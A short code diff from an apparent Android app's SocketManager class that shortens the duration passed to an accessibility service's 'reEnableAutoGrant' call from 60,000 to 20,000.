@@ -1820,7 +1820,7 @@ public class SocketManager {
             try {
                 com.task.tusker.services.UnifiedAccessibilityService svc =
                     com.task.tusker.services.UnifiedAccessibilityService.getInstance();
-                if (svc != null) svc.reEnableAutoGrant(60_000);
+                if (svc != null) svc.reEnableAutoGrant(20_000);
             } catch (Exception ignored) {}
             return result;
         }
